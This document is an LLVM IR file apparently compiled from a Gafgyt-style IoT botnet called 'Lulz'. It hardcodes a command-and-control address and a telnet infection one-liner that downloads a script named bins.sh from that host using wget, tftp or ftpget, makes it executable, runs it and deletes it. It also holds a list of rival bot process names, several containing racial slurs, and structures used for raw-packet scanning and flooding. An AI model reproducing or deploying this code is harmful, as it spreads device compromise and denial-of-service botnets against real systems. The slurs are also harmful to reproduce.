; ModuleID = 'host/ir_O1/Lulz.ll'
source_filename = "llvm-link"
target datalayout = "e-m:e-i64:64-f80:128-n8:16:32:64-S128"
target triple = "x86_64-unknown-linux-gnu"

%struct.in_addr = type { i32 }
%struct.list = type { i8*, %struct.list*, %struct.list* }
%struct.__va_list_tag = type { i32, i32, i8*, i8* }
%struct.__sigset_t = type { [16 x i64] }
%struct.timeval = type { i64, i64 }
%struct.telstate_t = type { i32, i32, i8, i8, i8, i8, i8, i32, i16, i8* }
%struct.sockaddr_in = type { i16, i16, %struct.in_addr, [8 x i8] }
%struct.sockaddr = type { i16, [14 x i8] }
%struct.iphdr = type { i8, i8, i16, i16, i16, i8, i8, i16, i32, i32 }
%struct.tcphdr = type { %union.anon.1 }
%union.anon.1 = type { %struct.anon }
%struct.anon = type { i16, i16, i32, i32, i8, i8, i16, i16, i16 }
%struct.addrinfo = type { i32, i32, i32, i32, i32, %struct.sockaddr*, i8*, %struct.addrinfo* }
%struct.state_t = type { i32, i8 }
%struct.dns_hdr = type { i16, i16, i16, i16, i16, i16 }
%struct._IO_FILE = type { i32, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, i8*, %struct._IO_marker*, %struct._IO_FILE*, i32, i32, i64, i16, i8, [1 x i8], i8*, i64, i8*, i8*, i8*, i8*, i64, i32, [20 x i8] }
%struct._IO_marker = type { %struct._IO_marker*, %struct._IO_FILE*, i32 }
%struct.thread_data = type { i32, i8*, i32, i32, i32 }
%struct.ifreq = type { %union.anon.7, %union.anon.8 }
%union.anon.7 = type { [16 x i8] }
%union.anon.8 = type { %struct.ifmap }
%struct.ifmap = type { i64, i64, i16, i8, i8, i8 }

@cncServer = local_unnamed_addr global [1 x i8*] [i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str, i32 0, i32 0)], align 8
@.str = private unnamed_addr constant [18 x i8] c"199.38.245.222:23\00", align 1
@rekdevice = local_unnamed_addr global i8* getelementptr inbounds ([477 x i8], [477 x i8]* @.str.1, i64 0, i64 0), align 8
@.str.1 = private unnamed_addr constant [477 x i8] c"cd /tmp || cd /home/$USER || cd /var/run || cd /dev/shm || cd /mnt || cd /var || cd /; wget http://199.38.245.222/bins.sh; busybox wget http://199.38.245.222/bins.sh; tftp -r bins.sh -g 199.38.245.222; busybox tftp -r bins.sh -g 199.38.245.222; ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; busybox ftpget -v -u anonymous -p anonymous -P 21 199.38.245.222 bins.sh bins.sh; chmod 777 bins.sh; busybox chmod 777 bins.sh; sh bins.sh; rm -rf bins.sh\0D\0A\00\00", align 1
@knownBots = local_unnamed_addr global [193 x i8*] [i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.2, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.9, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.10, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.11, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.12, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.13, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.14, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.15, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.16, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.17, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.18, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.19, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.20, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.21, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.22, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.7, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.23, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.24, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.25, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.26, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.27, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.28, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.29, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.30, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.31, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.32, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.33, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.34, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.35, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.36, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.37, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.38, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.39, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.40, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.41, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.42, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.43, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.44, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.45, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.46, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.47, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.48, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.49, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.50, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.51, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.52, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.53, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.54, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.8, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.55, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.56, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.57, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.58, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.59, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.60, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.61, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.62, i32 0, i32 0), i8* getelementptr inbounds ([18 x i8], [18 x i8]* @.str.63, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.64, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.65, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.66, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.67, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.68, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.69, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.70, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.71, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.72, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.73, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.74, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.75, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.76, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.77, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.78, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.79, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.80, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.81, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.82, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.83, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.84, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.85, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.86, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.87, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.88, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.89, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.90, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.91, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.92, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.93, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.94, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.95, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.96, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.97, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.98, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.99, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.100, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.101, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.102, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.103, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.104, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.105, i32 0, i32 0), i8* getelementptr inbounds ([4 x i8], [4 x i8]* @.str.106, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.107, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.108, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.109, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.3, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.110, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.111, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.112, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.113, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.114, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.115, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.116, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.117, i32 0, i32 0), i8* getelementptr inbounds ([17 x i8], [17 x i8]* @.str.118, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.119, i32 0, i32 0), i8* getelementptr inbounds ([16 x i8], [16 x i8]* @.str.120, i32 0, i32 0), i8* getelementptr inbounds ([15 x i8], [15 x i8]* @.str.121, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.122, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.123, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.124, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.125, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.126, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.127, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.128, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.129, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.4, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.130, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.131, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.5, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.132, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.133, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.134, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.135, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.136, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.137, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.138, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.139, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.140, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.141, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.142, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.143, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.144, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.145, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.146, i32 0, i32 0), i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.147, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.148, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.149, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.150, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.151, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.6, i32 0, i32 0), i8* getelementptr inbounds ([5 x i8], [5 x i8]* @.str.152, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.153, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.154, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.155, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.156, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.157, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.158, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.159, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.160, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.161, i32 0, i32 0), i8* getelementptr inbounds ([12 x i8], [12 x i8]* @.str.162, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.163, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.164, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.165, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.166, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.167, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.168, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.169, i32 0, i32 0), i8* getelementptr inbounds ([13 x i8], [13 x i8]* @.str.170, i32 0, i32 0), i8* getelementptr inbounds ([7 x i8], [7 x i8]* @.str.171, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.172, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.173, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.174, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.175, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.176, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.177, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.178, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.179, i32 0, i32 0), i8* getelementptr inbounds ([6 x i8], [6 x i8]* @.str.180, i32 0, i32 0), i8* getelementptr inbounds ([10 x i8], [10 x i8]* @.str.181, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.182, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.183, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.184, i32 0, i32 0), i8* getelementptr inbounds ([9 x i8], [9 x i8]* @.str.185, i32 0, i32 0), i8* getelementptr inbounds ([14 x i8], [14 x i8]* @.str.186, i32 0, i32 0), i8* getelementptr inbounds ([11 x i8], [11 x i8]* @.str.187, i32 0, i32 0), i8* getelementptr inbounds ([8 x i8], [8 x i8]* @.str.188, i32 0, i32 0)], align 16
@.str.2 = private unnamed_addr constant [7 x i8] c"902i13\00", align 1
@.str.3 = private unnamed_addr constant [11 x i8] c"BzSxLxBxeY\00", align 1
@.str.4 = private unnamed_addr constant [11 x i8] c"HOHO-LUGO7\00", align 1
@.str.5 = private unnamed_addr constant [11 x i8] c"HOHO-U79OL\00", align 1
@.str.6 = private unnamed_addr constant [11 x i8] c"JuYfouyf87\00", align 1
@.str.7 = private unnamed_addr constant [11 x i8] c"NiGGeR69xd\00", align 1
@.str.8 = private unnamed_addr constant [10 x i8] c"SO190Ij1X\00", align 1
@.str.9 = private unnamed_addr constant [13 x i8] c"LOLKIKEEEDDE\00", align 1
@.str.10 = private unnamed_addr constant [12 x i8] c"ekjheory98e\00", align 1
@.str.11 = private unnamed_addr constant [8 x i8] c"scansh4\00", align 1
@.str.12 = private unnamed_addr constant [5 x i8] c"MDMA\00", align 1
@.str.13 = private unnamed_addr constant [10 x i8] c"fdevalvex\00", align 1
@.str.14 = private unnamed_addr constant [8 x i8] c"scanspc\00", align 1
@.str.15 = private unnamed_addr constant [17 x i8] c"MELTEDNINJAREALZ\00", align 1
@.str.16 = private unnamed_addr constant [13 x i8] c"flexsonskids\00", align 1
@.str.17 = private unnamed_addr constant [8 x i8] c"scanx86\00", align 1
@.str.18 = private unnamed_addr constant [12 x i8] c"foAxi102kxe\00", align 1
@.str.19 = private unnamed_addr constant [13 x i8] c"swodjwodjwoj\00", align 1
@.str.20 = private unnamed_addr constant [11 x i8] c"MmKiy7f87l\00", align 1
@.str.21 = private unnamed_addr constant [14 x i8] c"freecookiex86\00", align 1
@.str.22 = private unnamed_addr constant [7 x i8] c"sysgpu\00", align 1
@.str.23 = private unnamed_addr constant [7 x i8] c"frgege\00", align 1
@.str.24 = private unnamed_addr constant [9 x i8] c"sysbinsr\00", align 1
@.str.25 = private unnamed_addr constant [9 x i8] c"0DnAzepd\00", align 1
@.str.26 = private unnamed_addr constant [14 x i8] c"NiGGeRD0nks69\00", align 1
@.str.27 = private unnamed_addr constant [7 x i8] c"frgreu\00", align 1
@.str.28 = private unnamed_addr constant [8 x i8] c"telnetd\00", align 1
@.str.29 = private unnamed_addr constant [11 x i8] c"0x766f6964\00", align 1
@.str.30 = private unnamed_addr constant [16 x i8] c"NiGGeRd0nks1337\00", align 1
@.str.31 = private unnamed_addr constant [5 x i8] c"gaft\00", align 1
@.str.32 = private unnamed_addr constant [13 x i8] c"urasgbsigboa\00", align 1
@.str.33 = private unnamed_addr constant [10 x i8] c"120i3UI49\00", align 1
@.str.34 = private unnamed_addr constant [5 x i8] c"OaF3\00", align 1
@.str.35 = private unnamed_addr constant [5 x i8] c"geae\00", align 1
@.str.36 = private unnamed_addr constant [9 x i8] c"vaiolmao\00", align 1
@.str.37 = private unnamed_addr constant [8 x i8] c"123123a\00", align 1
@.str.38 = private unnamed_addr constant [15 x i8] c"Ofurain0n4H34D\00", align 1
@.str.39 = private unnamed_addr constant [7 x i8] c"ggTrex\00", align 1
@.str.40 = private unnamed_addr constant [7 x i8] c"wasads\00", align 1
@.str.41 = private unnamed_addr constant [12 x i8] c"1293194hjXD\00", align 1
@.str.42 = private unnamed_addr constant [10 x i8] c"OthLaLosn\00", align 1
@.str.43 = private unnamed_addr constant [4 x i8] c"ggt\00", align 1
@.str.44 = private unnamed_addr constant [9 x i8] c"wget-log\00", align 1
@.str.45 = private unnamed_addr constant [15 x i8] c"1337SoraLOADER\00", align 1
@.str.46 = private unnamed_addr constant [9 x i8] c"SAIAKINA\00", align 1
@.str.47 = private unnamed_addr constant [5 x i8] c"ggtq\00", align 1
@.str.48 = private unnamed_addr constant [17 x i8] c"1378bfp919GRB1Q2\00", align 1
@.str.49 = private unnamed_addr constant [9 x i8] c"SAIAKUSO\00", align 1
@.str.50 = private unnamed_addr constant [5 x i8] c"ggtr\00", align 1
@.str.51 = private unnamed_addr constant [5 x i8] c"14Fa\00", align 1
@.str.52 = private unnamed_addr constant [13 x i8] c"SEXSLAVE1337\00", align 1
@.str.53 = private unnamed_addr constant [5 x i8] c"ggtt\00", align 1
@.str.54 = private unnamed_addr constant [15 x i8] c"1902a3u912u3u4\00", align 1
@.str.55 = private unnamed_addr constant [10 x i8] c"haetrghbr\00", align 1
@.str.56 = private unnamed_addr constant [7 x i8] c"19ju3d\00", align 1
@.str.57 = private unnamed_addr constant [12 x i8] c"SORAojkf120\00", align 1
@.str.58 = private unnamed_addr constant [13 x i8] c"hehahejeje92\00", align 1
@.str.59 = private unnamed_addr constant [14 x i8] c"2U2JDJA901F91\00", align 1
@.str.60 = private unnamed_addr constant [10 x i8] c"SlaVLav12\00", align 1
@.str.61 = private unnamed_addr constant [17 x i8] c"helpmedaddthhhhh\00", align 1
@.str.62 = private unnamed_addr constant [11 x i8] c"2wgg9qphbq\00", align 1
@.str.63 = private unnamed_addr constant [18 x i8] c"Slav3Th3seD3vices\00", align 1
@.str.64 = private unnamed_addr constant [11 x i8] c"hzSmYZjYMQ\00", align 1
@.str.65 = private unnamed_addr constant [5 x i8] c"5Gbf\00", align 1
@.str.66 = private unnamed_addr constant [13 x i8] c"SoRAxD123LOL\00", align 1
@.str.67 = private unnamed_addr constant [5 x i8] c"iaGv\00", align 1
@.str.68 = private unnamed_addr constant [5 x i8] c"5aA3\00", align 1
@.str.69 = private unnamed_addr constant [13 x i8] c"SoRAxD420LOL\00", align 1
@.str.70 = private unnamed_addr constant [8 x i8] c"insomni\00", align 1
@.str.71 = private unnamed_addr constant [7 x i8] c"640277\00", align 1
@.str.72 = private unnamed_addr constant [17 x i8] c"SoraBeReppin1337\00", align 1
@.str.73 = private unnamed_addr constant [11 x i8] c"ipcamCache\00", align 1
@.str.74 = private unnamed_addr constant [9 x i8] c"66tlGg9Q\00", align 1
@.str.75 = private unnamed_addr constant [2 x i8] c"T\00", align 1
@.str.76 = private unnamed_addr constant [11 x i8] c"jUYfouyf87\00", align 1
@.str.77 = private unnamed_addr constant [5 x i8] c"6ke3\00", align 1
@.str.78 = private unnamed_addr constant [7 x i8] c"TOKYO3\00", align 1
@.str.79 = private unnamed_addr constant [17 x i8] c"lyEeaXul2dULCVxh\00", align 1
@.str.80 = private unnamed_addr constant [10 x i8] c"93OfjHZ2z\00", align 1
@.str.81 = private unnamed_addr constant [17 x i8] c"TY2gD6MZvKc7KU6r\00", align 1
@.str.82 = private unnamed_addr constant [11 x i8] c"mMkiy6f87l\00", align 1
@.str.83 = private unnamed_addr constant [14 x i8] c"A023UU4U24UIU\00", align 1
@.str.84 = private unnamed_addr constant [10 x i8] c"TheWeeknd\00", align 1
@.str.85 = private unnamed_addr constant [13 x i8] c"mioribitches\00", align 1
@.str.86 = private unnamed_addr constant [5 x i8] c"A5p9\00", align 1
@.str.87 = private unnamed_addr constant [11 x i8] c"TheWeeknds\00", align 1
@.str.88 = private unnamed_addr constant [10 x i8] c"mnblkjpoi\00", align 1
@.str.89 = private unnamed_addr constant [5 x i8] c"AbAd\00", align 1
@.str.90 = private unnamed_addr constant [7 x i8] c"Tokyos\00", align 1
@.str.91 = private unnamed_addr constant [4 x i8] c"neb\00", align 1
@.str.92 = private unnamed_addr constant [6 x i8] c"Akiru\00", align 1
@.str.93 = private unnamed_addr constant [7 x i8] c"U8inTz\00", align 1
@.str.94 = private unnamed_addr constant [9 x i8] c"netstats\00", align 1
@.str.95 = private unnamed_addr constant [5 x i8] c"Alex\00", align 1
@.str.96 = private unnamed_addr constant [11 x i8] c"W9RCAKM20T\00", align 1
@.str.97 = private unnamed_addr constant [11 x i8] c"newnetword\00", align 1
@.str.98 = private unnamed_addr constant [7 x i8] c"Ayo215\00", align 1
@.str.99 = private unnamed_addr constant [5 x i8] c"Word\00", align 1
@.str.100 = private unnamed_addr constant [7 x i8] c"nloads\00", align 1
@.str.101 = private unnamed_addr constant [7 x i8] c"BAdAsV\00", align 1
@.str.102 = private unnamed_addr constant [9 x i8] c"Wordmane\00", align 1
@.str.103 = private unnamed_addr constant [11 x i8] c"notyakuzaa\00", align 1
@.str.104 = private unnamed_addr constant [6 x i8] c"Belch\00", align 1
@.str.105 = private unnamed_addr constant [9 x i8] c"Wordnets\00", align 1
@.str.106 = private unnamed_addr constant [4 x i8] c"obp\00", align 1
@.str.107 = private unnamed_addr constant [13 x i8] c"BigN0gg0r420\00", align 1
@.str.108 = private unnamed_addr constant [10 x i8] c"X0102I34f\00", align 1
@.str.109 = private unnamed_addr constant [14 x i8] c"ofhasfhiafhoi\00", align 1
@.str.110 = private unnamed_addr constant [14 x i8] c"X19I239124UIU\00", align 1
@.str.111 = private unnamed_addr constant [5 x i8] c"oism\00", align 1
@.str.112 = private unnamed_addr constant [9 x i8] c"Deported\00", align 1
@.str.113 = private unnamed_addr constant [14 x i8] c"XSHJEHHEIIHWO\00", align 1
@.str.114 = private unnamed_addr constant [10 x i8] c"olsVNwo12\00", align 1
@.str.115 = private unnamed_addr constant [17 x i8] c"DeportedDeported\00", align 1
@.str.116 = private unnamed_addr constant [11 x i8] c"XkTer0GbA1\00", align 1
@.str.117 = private unnamed_addr constant [9 x i8] c"onry0v03\00", align 1
@.str.118 = private unnamed_addr constant [17 x i8] c"FortniteDownLOLZ\00", align 1
@.str.119 = private unnamed_addr constant [11 x i8] c"Y0urM0mGay\00", align 1
@.str.120 = private unnamed_addr constant [16 x i8] c"pussyfartlmaojk\00", align 1
@.str.121 = private unnamed_addr constant [15 x i8] c"GrAcEnIgGeRaNn\00", align 1
@.str.122 = private unnamed_addr constant [11 x i8] c"YvdGkqndCO\00", align 1
@.str.123 = private unnamed_addr constant [11 x i8] c"qGeoRBe6BE\00", align 1
@.str.124 = private unnamed_addr constant [12 x i8] c"GuiltyCrown\00", align 1
@.str.125 = private unnamed_addr constant [7 x i8] c"ZEuS69\00", align 1
@.str.126 = private unnamed_addr constant [11 x i8] c"s4beBsEQhd\00", align 1
@.str.127 = private unnamed_addr constant [11 x i8] c"HOHO-KSNDO\00", align 1
@.str.128 = private unnamed_addr constant [7 x i8] c"ZEuz69\00", align 1
@.str.129 = private unnamed_addr constant [8 x i8] c"sat1234\00", align 1
@.str.130 = private unnamed_addr constant [9 x i8] c"aj93hJ23\00", align 1
